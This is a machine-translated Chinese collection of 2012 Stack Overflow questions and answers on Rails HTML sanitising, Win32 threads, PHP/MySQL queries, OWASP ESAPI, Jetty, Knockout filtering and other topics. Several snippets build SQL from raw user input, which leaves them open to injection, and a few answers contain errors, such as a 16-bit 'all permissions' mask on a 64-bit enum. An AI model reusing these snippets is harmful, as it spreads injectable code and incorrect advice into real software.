在我的网站上，用户可以发表评论。我希望他们能够在他们的评论中插入基本的 HTML，包括粗体、斜体和链接标签。不幸的是，Rails 会自动转义所有用户生成的 HTML。

我可以通过调用 .html_safe 来绕过这种行为，但这样我的网站就容易受到 XSS 的攻击。有没有办法允许粗体、斜体和链接标签，同时仍然转义其他内容？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T23:18:27.460

您可以使用诸如降价之类的东西通过替代方式（不是直接使用 html）来支持格式化。Markdown 可以通过许多 ruby​​gems 来支持，包括 Redcarpet、markitup 等。Markdown 为粗体/斜体等创建了一种替代语法（如 bbcode）。

[https://github.com/jwigal/markitup_rails](https://github.com/jwigal/markitup_rails)

您还可以使用像 Loofah 这样的白名单消毒剂 - [https://github.com/flavorjones/loofah/](https://github.com/flavorjones/loofah/)。Loofah 是一种更高端的解决方案，支持您想要的任何 html 标签。用户将提交 HTML，然后 Loofah 将读取它，并使用 nokogiri 构建一个 html 节点树。然后它遍历树，确保所有标签节点都使用列入白名单的 html 标签，允许您允许任何您想要的标签组合，包括 <a>、<img>、<table> 等。它是高度可配置的。

Loofah 还会检查属性（取决于配置），以确保在 onclick="" 等禁止属性中没有隐藏任何内容

# c++ - 64 位 DLL 中的 CreateThread 不起作用

> ID：12014085
> 
> 赞同：0
> 
> 时间：2012-08-17T22:41:30.433
> 
> 标签：c++, c, visual-studio-2010, winapi, 64-bit

我有一个 32 位和一个 64 位的可执行文件。两者都加载相同位的 DLL，就像在 64 位可执行文件中加载 64 位 dll 一样。无论如何，32 位 DLL 完美运行，它创建一个线程并弹出一个 hello world 消息框。然而，64 位 DLL，那段代码永远不会执行。这就像 createthread 失败了。

```
 case DLL_PROCESS_ATTACH:
        myFunc();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

void myFunc()
{

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&MyThread, NULL, 0, NULL);
}

DWORD WINAPI MyThread(LPVOID param)
{
    MessageBoxA(0, "HELLO 64", 0,0);
    ExitThread(0);
} 
```

这些是 DLL 中的一些片段。我已经用谷歌搜索了，我能想到的只是堆栈对齐失败了吗？如果这是原因，我该如何正确调用 CreateThread 使其工作？如果这不是原因，有谁知道可能是什么问题？

我将非常感谢任何帮助，在此先感谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T23:16:43.747

您的 MyThread 签名错误。您不应该强制转换它，您应该确保您的函数与签名匹配。正确的代码是：

```
CreateThread(NULL, 0, MyThread, NULL, 0, NULL);

DWORD WINAPI MyThread(LPVOID param)
{
    // etc
} 
```

除此之外，您不应该在您的 DllMain 中像@GSerg 评论那样做任何事情，因为当您在那里时有一个锁被持有。通过执行任何复杂的操作，您可能会无意中加载另一个导致死锁的 DLL。

相反，您通常在 DLL 中有一个单独的初始化函数，您的调用代码可以在加载 DLL 后调用它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-19T07:02:20.550

好的，解决方法很简单，线程退出得太早了。添加 WaitForSingleObject(hThread, INFINITE); 解决了这个问题。由于某种原因，在 32 位中没有必要。:)

# php - Mysql Query 在特定情况下不起作用

> ID：12014086
> 
> 赞同：3
> 
> 时间：2012-08-17T22:41:37.900
> 
> 标签：php, mysql

有一个包含两列“ques”和“ans”的表。通过此查询进行比较后，我计算了 mysql_nuum_rows($result) 获取的行数。在某些情况下，如果我为所有问题选择相同的选项（每种情况下的最后一个选项，即单选按钮的 D），我会遇到错误。其余的工作完美。

我究竟做错了什么？

```
//  (Values are coming from html form consisting of 4 sets of 4 radio buttons)
$q1=$_POST['q1'];
$q2=$_POST['q2'];
$q3=$_POST['q3'];
$q4=$_POST['q4'];
$result = mysql_query("SELECT * FROM Test  
               WHERE (ques='q1' AND ans='$q1') 
               OR (ques='q2' AND ans='$q2') 
               OR (ques='q3' AND ans='$q3') 
               OR (ques='q4' AND ans='$q4')"); 
```

**预期输出：**
您在 4 个中得到 3 个正确答案（3 个来自`mysql_num_rows()`）

**错误来了：**
您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以了解在 'q2' AND ans='4') OR (ques='q3' AND ans='4') OR (ques='q4' AND ans 附近使用的正确语法='4')' 在第 1 行

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T23:00:24.330

你做错了什么：

a）您没有使用准备好的语句。这意味着用户提供的输入最终会出现在您的 SQL 语句中，从而使您面临无法预料的风险（SQL 注入）。这也可能是 SQL 错误的原因。您可以将 SQL 语句分配给一个变量并将其转储到某个地方，这样您就可以看到您实际尝试执行的操作。或者（更好）你可以使用准备好的语句。

b) 如果您的表单将扩展到 25 个问题和答案，那么 SQL 语句看起来有问题。如果不是 - 为什么要为此使用 SQL 后端？

# java - 尝试使用 OWASP ESAPI 时找不到 antisamy-esapi.xml

> ID：12014097
> 
> 赞同：5
> 
> 时间：2012-08-17T22:44:18.977
> 
> 标签：java, resources, owasp, esapi

我一直在尝试评估 OWASP ESAPI 库，但是在让它正确初始化时遇到了问题。我为 ESAPI.properties 和 validation.properties 设置了一个资源文件夹，它们是从类路径加载的，没有问题。但是 antisamy-esapi.xml 文件不是从类路径加载的，我发现 2010 年的一个错误提到了这一点。我得到的错误是：

> 尝试通过文件 I/O 将 antisamy-esapi.xml 作为资源文件加载。在“org.owasp.esapi.resources”目录中找不到或文件不可读：C:\Users\mydir\resin-pro-4.0.27\antisamy-esapi.xml 在 SystemResource 目录/resourceDirectory 中找不到：.esapi\antisamy -esapi.xml 在 'user.home' (C:\Users\mydir) 目录中找不到：C:\Users\mydir\esapi\antisamy-esapi.xml

我正在使用此库将应用程序部署到树脂。我已经尝试将 xml 文件手动放置在上面的所有位置中，最终唯一有效的是我的主目录，这对于生产部署来说效果不佳。

我还遵循了在其他地方找到的建议，该建议说设置 -Dorg.owasp.esapi.resources 属性。这也不起作用，但更有趣的是，错误并没有改变，这让我认为该设置由于某种原因没有被选中。

关于该文件需要在我的项目中的位置的任何指针，以便在部署到容器后正确加载？

提前致谢。

更新：

因此，通过挖掘代码，似乎有专门的函数用于加载 ESAPI.properties，这就是为什么该文件能够从部署到容器的标准资源（或任何其他 src 目录）目录加载的原因。然而，antisamy-esapi.xml 的加载函数只是检查 user.home 下的特定目录、配置的自定义目录或通过 ClassLoader.getSystemResource() 的结果。不知道为什么这些例程是分开的。在搞砸了几个小时后，我失去了耐心并复制了 DefaultSecurityConfiguration.java 并更正了 getResourceFile() 方法以使用与 loadConfigurationFromClasspath() 相同的查找代码。然后我用这个类调用 ESAPI.override() ，它现在似乎工作正常。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-02-19T19:56:43.617

我设法通过为 esapi 资源添加以下行来使其工作：

```
System.setProperty("org.owasp.esapi.resources", "src/main/resources"); 
```

[DefaultSecurityConfiguration.java](https://github.com/jackyu1978/owasp-esapi-java/blob/a6914588783e1c752f4cc4b08d99ee2d7dddacda/src/main/java/org/owasp/esapi/reference/DefaultSecurityConfiguration.java)

至少现在我可以使用`instance.getValidSafeHTML`

但是，当一个部署到 Web 服务器时它不会工作。`antisamy-esapi.xml`我猜想从类路径加载要加载的补丁是必需的。

# java - 有一个类似@Formula 的注释来从 JPA（EclipseLink）中的子查询设置计算字段？

> ID：12014100
> 
> 赞同：3
> 
> 时间：2012-08-17T22:44:30.630
> 
> 标签：java, sql, jpa, eclipselink

我是一个非常新的 JPA 用户。

我想知道如何根据计算的子查询值设置字段，例如：

```
@[Annotation]("select count(*) from ...") 
long calculatedField; 
```

那可能吗？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T03:56:11.800

你所说的没有JPA注释。但是您可以根据需要创建自己的注释并在实体中使用自己的注释。请参阅[此示例](http://sujitpal.blogspot.com/2008/03/my-first-custom-annotation.html)以在 JPA 中创建和使用自定义注释。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-03T18:48:43.020

[我尝试用http://wiki.eclipse.org/EclipseLink/Examples/JPA/MappingSelectionCriteria](http://wiki.eclipse.org/EclipseLink/Examples/JPA/MappingSelectionCriteria)做一些像你一样的事情

我想把sql直接放在方法public void customize(ClassDescriptor descriptor)中的列映射中抛出异常；

当实验失败（文档很差）时，我检查了这个：

```
private BigDecimal quantityOrders;

@Column(name="(select 2 from dual) as quantityOrders",insertable = false, updatable = false)
public BigDecimal getQuantityOrders() {
    return quantityOrders;
} 
```

...而且，它正在工作！

然后我放了更复杂的选择，它也可以工作。我找不到任何文档。

# coldfusion - 无法从本地主机发送邮件

> ID：12014101
> 
> 赞同：1
> 
> 时间：2012-08-17T22:44:52.097
> 
> 标签：coldfusion

我正在尝试获得我的 CF10 开发人员许可证来发送邮件。

```
Mail server: smtp.gmail.com
UserName: xxx
Password: xxx 
```

我检查“验证邮件服务器连接”并按提交更改，它显示连接验证成功。

我关闭了“假脱机邮件以进行传递”，我得到：

> 此异常是由以下原因引起的：com.sun.mail.smtp.SMTPSendFailedException: 530 5.7.0 必须先发出 STARTTLS 命令。t39sm8098054anh.3 。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-17T23:04:26.700

您必须为 gmail 使用 SSL。见[这里](http://cookbooks.adobe.com/post_Sending_an_Email_through_GMail_With_ColdFusion-16234.html)。

# javascript - html5 javascript在对象数组上的冲突

> ID：12014113
> 
> 赞同：1
> 
> 时间：2012-08-17T22:47:39.517
> 
> 标签：javascript, canvas, collision

我有一个逻辑问题，也许你们聪明的人可以帮我解决。我正在使用 Canvas 学习 Javascript，并且正在尝试使用纯 Javascript 构建一种“突围”游戏。

[http://www.seas.upenn.edu/~cis120e/hw/SwingGame/images/breakout.png](http://www.seas.upenn.edu/~cis120e/hw/SwingGame/images/breakout.png)

我创建了桨、球，然后是一组具有不同属性（xPos、yPos、宽度......等）的块对象，现在我试图检测球与顶部块的碰撞屏幕。

这就是我的做法：

```
//This is my block Object definition
function block(x,y,width,height){
this.x = x;
this.y = y;
this.width = width;
this.height = height;
ctxBlock.fillStyle = 'green';
ctxBlock.fillRect(this.x, this.y, this.width, this.height); 
```

}

```
//This is for draw blocks on the canvas
mattone.prototype.draw = function(){
ctxBlock.fillStyle = 'green';
ctxBlock.fillRect(this.x, this.y, this.width, this.height); 
```

}

```
//This is the check for collision method
var blocks = [];
function checkCollision(){
for (var i = 0; i < blocks.length; i++){

    if(ballY - ballRadius <= blocks[i].y + blockWidth){
        ctxBlocks.clearRect(tmpx, tmpy, blockWidth, blockHeight);
        speedY = (-speedY);
        break;
    }
}

checkColl = requestAnimationFrame(checkCollision); 
```

}

基本上我想告诉画布，当球的“Y”是“<”然后是块数组中一个块的“Y”（循环槽并检查每个块）时，他必须删除那块并反弹下来。

但它所做的始终是取消该行块中左侧的第一个块，而不是他触摸的块。

这应该是我的代码链接的[链接](http://jsfiddle.net/43mwc) *请注意我在我的代码中使用了 mattoni 这个词而不是块

祝大家有个愉快的一天

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T23:26:02.757

非常好！也感谢您提供完整的 jsfiddle。我对此进行了更新：http:
[//jsfiddle.net/43mwc/2/](http://jsfiddle.net/43mwc/2/)。现在解释一下：您的碰撞检查只需要检查每个块的所有边界，而不仅仅是您正在做的底部。所以我改变了这个：

```
if(ballY - ballRadius <= blocks[i].y + blockWidth){ 
```

对此（用你的jsfiddle的措辞）：

```
if(ballY-ballRadius <= mattoni[i].y + 10- padding && (ballX - ballRadius) >= mattoni[i].x && (ballX + ballRadius) <= (mattoni[i].x + mattWidth)){ 
```

解释一下，您的代码循环遍历每块砖，检查球是否直接位于每块砖的下方。整个底排砖块都满足该标准，因此您的循环`break;`在位于底排的循环中的第一块砖块上中断（如 ）。现在正在检查球沿 x 轴的位置是否在每个砖块的左右边缘之间。这里还有一种情况没有涉及：从顶部击中砖块。我会把那个留给你。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T23:27:07.277

您只在碰撞检查中检查了 y 值，而不是 x 值。每当你碰到最后一行的砖块时，最左边的砖块就会被清除，因为它与 y 值匹配。在那之后，你跳出循环。

其次，您没有跟踪已清除的块。结果，*每个*循环都清除了最后一行的左砖，而其他砖没有得到清除的更改，因为您在那之后退出了循环。

[http://jsfiddle.net/43mwc/3/](http://jsfiddle.net/43mwc/3/)

# asp.net-mvc - 如何使用基于任务的模型授权请求

> ID：12014121
> 
> 赞同：2
> 
> 时间：2012-08-17T22:48:33.873
> 
> 标签：asp.net-mvc, authorization

我们正在使用 MVC 设计应用程序。我们有成千上万的用户和 100 多个角色。任务（特定操作的访问权限）分配给角色。有许多任务分配给多个角色，这意味着任务可以在角色之间共享。由于应用程序的性质，我们必须添加/删除/更新角色，因此我们不能使用基于角色的授权。

需要帮助来建议如何在应用程序不关心角色的情况下实施基于任务的授权。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T23:25:13.893

您可以使用[位标志枚举](http://msdn.microsoft.com/en-us/library/cc138362.aspx)来创建任务列表并使用它们分配用户权限。不幸的是，即使您使用 ulong，这也会限制您使用最多 64 个选项。这是一个示例代码：

```
[Flags]
public enum TaskPermissions : ulong
{
    None = 0x0000,
    CanDoTask1 = 0x0001,
    CanDoTask2 = 0x0002,
    CanDoTask3 = 0x0004,
    CanDoTask4 = 0x0008,
    CanDoTask5 = 0x0010,
    // ... powers of 2
    CanDoEverything = 0xFFFF
}

public class Member
{
    public string Username {get;set;}
    public TaskPermissions Permissions { get; set; }
    // other things that are necessary

    public bool HasPermission(TaskPermissions permissions)
    {
        return (Permissions & permissions) == permissions;
    }
} 
```

要设置权限：

```
var member=new Member():
member.Permissions= TaskPermissions.CanDoTask1 | TaskPermissions.CanDoTask2; 
```

检查权限：

```
member.HasPermission(TaskPermissions.CanDoTask1); 
```

Mvc 的示例 AuthorizationRequiredAttribute（假设成员在会话中）：

```
[AttributeUsage(AttributeTargets.Class | AttributeTargets.Method, Inherited = true, AllowMultiple = true)]
public class AuthorizationRequiredAttribute : ActionFilterAttribute
{
    public TaskPermissions RequiredPermissions { get; set; }
    public override void OnActionExecuting(ActionExecutingContext filterContext)
    {
        if (filterContext.Controller.Session["Member"].HasPermission(RequiredPermissions))
        {
            base.OnActionExecuting(filterContext);
            return;
        }
        throw new AuthenticationException("Access denied");
    }
} 
```

用法：

```
[AuthorizationRequired(RequiredPermissions = TaskPermissions.CanDoTask1)]
public class TestController : Controller
{
    //methods
} 
```

# java - Jetty servlet url 和端口

> ID：12014122
> 
> 赞同：1
> 
> 时间：2012-08-17T22:48:41.173
> 
> 标签：java, servlets, jetty

什么是方法调用来确定 jetty servlet 正在运行的 url 和端口是什么？这样我就可以在屏幕上打印它，并在客户端使用它来连接：

```
url = new URL("trying to figure this out"); 
```

我在本地运行客户端和服务器，在 Eclipse 中，这是一个学校项目。

相关代码：

```
import org.eclipse.jetty.server.Server;
import org.eclipse.jetty.servlet.DefaultServlet;
import org.eclipse.jetty.servlet.ServletContextHandler;
import org.eclipse.jetty.servlet.ServletHolder;

public class ServerMain {

    public static void main(String[] args){
        Server server = new Server();
        ServletContextHandler context = 
                new ServletContextHandler(ServletContextHandler.SESSIONS);
        context.setContextPath("Servlet");

        context.setResourceBase("etc/docroot");

        server.setHandler(context);
        context.addServlet(new ServletHolder(new MyServer()), "/game");
        DefaultServlet staticFileServlet = new DefaultServlet();
        context.addServlet(new ServletHolder(staticFileServlet), "/*");
        System.out.println("context: " +  context.getContextPath());
        //System.out.println("One valid Port = "
                  + context.getServer().getConnectors()[0].getPort());
        try {
            server.start();
            server.join();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-18T13:19:05.443

由于您正在执行此嵌入式操作，因此您有几个选择。

服务器服务器=新服务器（8080）；

这将在端口 8080 上启动服务器，如果这是您想要的，这很好，但在单元测试中，您通常希望这是一个随机端口，以避免 CI 或并行测试等问题相互绊倒。

服务器服务器=新服务器（0）；

这将在随机端口上启动连接器，但是如何获取该端口？

server.getConnectors()[0].getLocalPort();

该端口实际上来自连接器，通常您只在此处设置一个连接器，因此您可以使用该端口。

现在 localhost 可以很好地进行测试，但是如果您想要连接器所在的主机的名称，可以使用以下命令：

server.getConnectors()[0].getHost();

把这些东西串起来，你就会知道我们如何在码头本身进行大部分单元测试，启动服务器本身，连接我们想要的任何处理程序或 webapp，然后断言行为、请求、响应等。

我们这里有许多嵌入式示例，您可以查看在代码中连接 jetty 的不同方法，jetty.xml 格式只是 java 之上的一层 xml，因此您可以通过代码轻松映射 jetty 的启动通过阅读带有 java 帽子的 xml 文件。如果您想将配置保留在那里，这里还有一个嵌入式示例，用于基于该 xml 格式引导码头。

[http://git.eclipse.org/c/jetty/org.eclipse.jetty.project.git/tree/example-jetty-embedded/src/main/java/org/eclipse/jetty/embedded](http://git.eclipse.org/c/jetty/org.eclipse.jetty.project.git/tree/example-jetty-embedded/src/main/java/org/eclipse/jetty/embedded)

有关嵌入码头的好页面，请看这里： http: [//www.eclipse.org/jetty/documentation/current/embedding-jetty.html](http://www.eclipse.org/jetty/documentation/current/embedding-jetty.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T22:59:43.220

默认情况下，码头服务器很可能在 8080 上运行。如果没有，你可以去检查 server.xml 文件，它应该告诉你端口配置是什么。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T22:57:36.447

我不确定你在这里问什么，但如果你有一些 servlet 即 Hello ：

```
public final class Hello extends HttpServlet {

    public void doGet(HttpServletRequest request,
                      HttpServletResponse response)
      throws IOException, ServletException {

        response.setContentType("text/html");
        PrintWriter writer = response.getWriter();        
        writer.println("URL is " + request.getRequestURL() + " port is " request.getServerPort());
    }
} 
```

此外，如果这不是您要查找的信息，请参阅：

~~http://docs.oracle.com/javaee/1.4/api/javax/servlet/http/HttpServletRequest.html~~

[http://docs.oracle.com/cd/E17802_01/webservices/webservices/docs/1.6/api/javax/servlet/http/HttpServletRequest.html](http://docs.oracle.com/cd/E17802_01/webservices/webservices/docs/1.6/api/javax/servlet/http/HttpServletRequest.html)

# php - 我建立 PHP 会话的方式有什么问题？

> ID：12014123
> 
> 赞同：0
> 
> 时间：2012-08-17T22:48:50.173
> 
> 标签：php, session

我正在使用以下代码。会话在同一页面上工作；在下一页上，它没有显示会话变量值。请让我知道我做错了什么？

```
<?php 
    session_start();
    $_SESSION['emailaddress']=$emailAddress;
    header("Location: $success "); /* Redirect browser */
    exit;
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T22:53:42.783

use `session_start()` in the page that you are redirecting to, as well (`$success`), before accessing the session values there

So that the "success.php" page looks something like:

```
<?
session_start();
print_r($_SESSION); 
?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T23:02:48.123

```
<?php
if(some_condition is true)
{
session_regenerate_id();
session_start();
$_SESSION['emailaddress']=$emailAddress;
header("location: member-index.php");
exit();
} 
```

## 在安全页面上：

```
<?php
//Start session
session_start();
//Check whether the session variable is present or not
       if(!$_SESSION['emailAddress']) 
        {
        header("location: access-denied.php");
        exit();
    }
?>

<p>This is secured page with session: <b><?php echo $_SESSION['emailAddress']; ?></b> 
```

# google-apps-script - 如何在 ScriptDB 数据库中查询键：嵌套在数组对象中的对象内的值 Google Apps 脚本

> ID：12014125
> 
> 赞同：3
> 
> 时间：2012-08-17T22:49:18.267
> 
> 标签：google-apps-script, javascript-objects

假设存储在 ScriptDb 中的对象*模式：*

```
{name: 'alice',
 age:  12,
 interests: [
     {interest: 'tea parties', enthusiasm: 'high'},
     {interest: 'croquet', enthusiasm: 'moderate'},         
 ]
} 
```

我了解如何查询前两个*属性*，但不了解如何运行查询以返回所有*行*`interests[enthusiasm = moderate]`

从字面上看这个例子并尝试：`db.query({interests:[{enthusiasm: 'moderate'}]});` 返回一个**ScriptDbResult**但任何尝试使用该结果的方法都会导致错误：

```
Queries can only contain letters, numbers, spaces, dashes and underscores as keys. 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-19T05:09:58.413

目前这是不可能的。它可能会在未来的更新中得到支持。您现在能做的最好的事情就是加载所有兴趣并自己循环浏览它们。

# ios - iOS coco2d 环境中的对象可以保留吗？

> ID：12014126
> 
> 赞同：0
> 
> 时间：2012-08-17T22:49:23.670
> 
> 标签：ios, cocos2d-iphone

我在 coco2d 环境中有几个需要保留的自定义对象。所以我设置

```
 @property(nonatomic, assign) int score;
      @property(nonatomic, assign) Object *obj1; 
```

在我的 CCLayer 场景中，我合成了 score 和 obj1，在 init 函数期间我设置了 score 和 obj1 的值，但是后来，我发现 score 和 obj1 没有值或未分配 score=0；和 obj1 = 0x0; 这是怎么回事？coco2d环境下可以保留东西吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T00:24:30.183

您可能（或可能不需要）需要保留，`obj1`具体取决于您使用它的方式，但问题`score`指向其他问题。最常见的原因是拥有同一个对象的两个副本，在一个中设置一个值，然后尝试在另一个中读取它。尝试`self`将分配到的`score`位置和读取位置的值记录为意外值。如果地址显示不同`self`的 s 将确认它。

# knockout.js - 使用 Knockout 过滤 ViewModel 数据，使用多个字段/列和控件

> ID：12014128
> 
> 赞同：9
> 
> 时间：2012-08-17T22:49:45.187
> 
> 标签：knockout.js

我是 KnockoutJS 的新手，但到目前为止我很喜欢。我想要做的是使用表单上的多个字段/列和控件过滤我的视图模型的数据，但我不知道该怎么做。让我（希望）进一步解释。

我有一个 viewmodel 可观察的数据数组，其中填充了来自后端数据库的 JSON 数据。这个数据集合有多个我想过滤的列，以便显示更改为仅显示所选项目。如链接[http://www.knockmeout.net/2011/04/utility-functions-in-knockoutjs.html](http://www.knockmeout.net/2011/04/utility-functions-in-knockoutjs.html)所示，我已经使用 ko.utils.arrayFilter 和 ko.utils.stringStartsWith 遵循了该示例。这作为一种搜索类型的过滤器非常有效 - 但仅适用于我的数据表（视图模型）中的一个字段。

第一个问题：有没有办法扩展这个例子，让在文本框中输入的值在视图模型的多个列中搜索，并返回结果以供显示？

然而，更重要的是，我的情况是，我在表单上有多个不同类型的控件（带有值列表的下拉列表、带有不同选项的单选按钮等），我需要根据选择的选项过滤完整的数据集在这些控件中。而且，控件的有效值与视图模型数据集中的不同列/字段相关。

我希望这是有道理的。基本上，我们正在尝试替换具有相同功能的 Windows 窗体应用程序。也就是说，对于 Windows 窗体应用程序，所有过滤选项都在为 SQL 选择构建一个大的 where 子句（例如，WHERE Name = 'name selected in dropdown' AND Priority IN（一个或多个选中的复选框选项）AND View = 选定的单选按钮等）。然后将 SQL 查询发送到数据库，并将结果放入网格中。

那么，有什么方法可以让我在视图模型中的多个字段（当然还有淘汰赛）上使用多个过滤器值来过滤和显示我的所有数据在客户端？或者我是否必须遵循与 Windows 应用程序类似的想法，并使用所选选项中的 where 子句重新查询数据库？

谢谢！

如果您需要更多详细信息，请告诉我（很难以书面形式解释）。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-08-18T00:24:43.047

您只需将 中的术语组合起来`arrayFilter`，就像这样。

```
self.filteredRecords = ko.computed(function() {
        return ko.utils.arrayFilter(self.records(), function(r) {
            return (self.idSearch().length == 0 ||
                       ko.utils.stringStartsWith(r.id, self.idSearch())) &&
                   (self.nameSearch().length == 0 || 
                       ko.utils.stringStartsWith(r.name.toLowerCase(), self.nameSearch().toLowerCase())) &&
                  (self.townSearch().length == 0 ||
                       r.homeTown == self.townSearch())
        });
    }); 
```

这是[小提琴](http://jsfiddle.net/tyrsius/67kgm/)

# mysql-python - 连接到 mysqldb 时出错

> ID：12014130
> 
> 赞同：0
> 
> 时间：2012-08-17T22:50:48.747
> 
> 标签：mysql-python

如何解决以下代码中的以下错误。该应用程序是一个 python 电话应用程序，它从 mysqldb 数据库中检索姓名和电话号码。给我错误的行是 phoneList = c.fetchrows()。我非常感谢您的帮助。

# AttributeError：“NoneType”对象没有属性“fetchrows”

```
#connecting to database

from Tkinter import *

import MySQLdb

db = MySQLdb.connect(host = "localhost", user = "xxxxxxx", passwd = "xxxxxxxx", db ="test")

# which item is selected

def whichSelected () :

    print "At %s" % (select.curselection())

    return int(select.curselection()[0])

# doing sql query
def dosql (cmd) :

    print cmd
    c = db.query(cmd)
    setSelect ()

# the generation of new id numbers as new rows are inserted.
def addEntry () :

    c = db.query("select max(id)+1 from phones")
    id = c.fetchdict()[0].values()[0] # digs deep to get next id
    dosql("insert into phones values (%d,'%s','%s')" % (id,nameVar.get(), phoneVar.get()))
#updating the entries

def updateEntry() :

    id = phoneList[whichSelected()][0]
    dosql("update phones set name='%s', phone='%s' where id=%d" %
      (nameVar.get(), phoneVar.get(), id))

# deleting the entries

def deleteEntry() :

    id = phoneList[whichSelected()][0]
    dosql("delete from phones where id=%d" % id)
# loading the entries 

def loadEntry () :

    id, name, phone = phoneList[whichSelected()]
    nameVar.set(name)
    phoneVar.set(phone)

# building my windows
def makeWindow () :

    global nameVar, phoneVar, select
    win = Tk()

    frame1 = Frame(win)
    frame1.pack()
    . 
    . 
    .
    .
# the function "setSelect" which fills in our list control. Here, instead of importing the phone list, we simply use fetchrows to get the same list of lists.

def setSelect () :

    global phoneList
    c = db.query("select id,name,phone from phones order by name")
    phoneList = c.fetchrows()
    select.delete(0,END)
    for id,name,phone in phoneList :
    select.insert (END, name)

win = makeWindow()

setSelect()

win.mainloop() 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T00:03:37.923

所以主要原因是它`db.query`不会返回任何东西 - 你必须使用`db.store_result()`or （请参阅[此处](http://mysql-python.sourceforge.net/MySQLdb.html)`db.use_result()`的完整文档）。然而，这是使用- 我们将在这个例子中使用：`_mysql``MySQLdb`

```
def setSelect():
    global phoneList
    # You have your connection db set up, so now we make a cursor
    c = db.cursor()

    # Now execute your query using the cursor 'execute' method
    c.execute("select id,name,phone from phones order by name")

    # Now we pull the results from the query and store them in phoneList
    phoneList = c.fetchall()

    # And I know nothing about Tkinter, so hopefully the rest will work :)
    select.delete(0,END)

    # phoneList will represent each row as a tuple, so make sure to verify this part
    for id,name,phone in phoneList :
      select.insert (END, name) 
```

希望有帮助！

# linux - linux屏幕见前几行

> ID：12014133
> 
> 赞同：2
> 
> 时间：2012-08-17T22:51:29.103
> 
> 标签：linux, gnu-screen

当我使用屏幕运行某些任务时，出现了一些错误。想看详情却只能回滚一页，前面的都是黑的。有什么办法可以看到前面的行吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-17T22:54:12.843

`screen`您可以在文件中配置回滚缓冲区`.screenrc`：

```
defscrollback 5000 
```

将允许滚动 5000 行。

此外，在启动期间，您可以使用`-h 5000`指定当前`screen`会话的缓冲区：

```
screen -h 5000 
```

此方法可用于覆盖单次使用的默认设置（谁退出屏幕？！=P）。

查看这篇文章了解详细信息 - [GNU Screen: Working with the Scrollback Buffer](http://www.samsarin.com/blog/2007/03/11/gnu-screen-working-with-the-scrollback-buffer/)

# php - 获取数据库表中列的最大值

> ID：12014134
> 
> 赞同：2
> 
> 时间：2012-08-17T22:51:29.017
> 
> 标签：php, mysql, sql

我正在尝试获取数据库表中列的最大值。

这是我的PHP：

```
$st = mysql_fetch_assoc(mysql_query("SELECT max(`version`) FROM `remembers` WHERE id='$id'"));
$version = $st['version'] + 1; 
```

所以这应该得到当前版本，`id`然后更新它，但添加 1 到它。但`$st['version']`似乎`0`在数据库中当前最高时返回`1`

我做错了吗？有没有更好的存档方法？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-17T22:52:58.927

您必须`MAX()`在 SQL 中为选择设置别名，以便在 PHP 中引用它：

```
SELECT max(`version`) AS version FROM ... 
```

此外，`mysql_fetch_assoc`返回一个数组数组，因此您不能简单地`$st['version']`直接引用。相反，您可以将 PHP 更改为：

```
$st = mysql_fetch_row(mysql_query("SELECT max(`version`) AS version FROM `remembers` WHERE id='$id'"));
$version = $st[0] + 1; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T22:55:23.617

SQL 有一个函数调用 max() 并且您在正确的上下文中使用它。你离做对了！

您只需要使用 AS 关键字。

SELECT max( `version`) AS max_version FROM `remembers`WHERE id='$id'

# javascript - 如何通过 JavaScript “合并”两个 HTML 标签

> ID：12014138
> 
> 赞同：0
> 
> 时间：2012-08-17T22:52:40.487
> 
> 标签：javascript, html, merge, tags

这是我的 HTML“沙箱”：

```
<p>1 2 3</p>
<span id="myid">
<span id="mytext">
<p>4 5 6</p>
<p>7 8 9</p>
<p>10 11 12</p>
</span>
</span>
<p>13 14 15</p> 
```

我想相应地“合并” p 标签：（
*为了更容易看到我在进行更改的地方添加了一个**减号**：）*

```
<p>1 2 3 -
<span id="myid">
<span id="mytext">
- 4 5 6</p>
<p>7 8 9</p>
<p>10 11 12 -
</span>
</span>
- 13 14 15</p> 
```

我添加了一个减号的每个地方，我实际上已经剥离了一个`<p>`或`</p>`标记，在两个段落元素之间进行合并（在 1 2 3 和 4 5 6 之间以及 10 11 12 和 13 14 15 之间）-（**此合并仅实现 123-456 和 101112-131415 的内联显示**）。

**如何使用“原始”JavaScript（请不要使用库）来实现此结果。**

注意： *我试图创建一些东西，但我花了 80 行代码 - 我相信有更好的方法来做到这一点。*

**编辑：** 乔恩汉纳在他的评论中提到我可以像这样使用正确的 HTML（作为 JavaScript 的结果）：

```
 <p>1 2 3 <span class="myclass mytext">4 5 6</span></p>
<p class="myclass mytext">7 8 9</p>
<p><span class="myclass mytext"10 11 12</span> 13 14 15</p> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T23:05:33.627

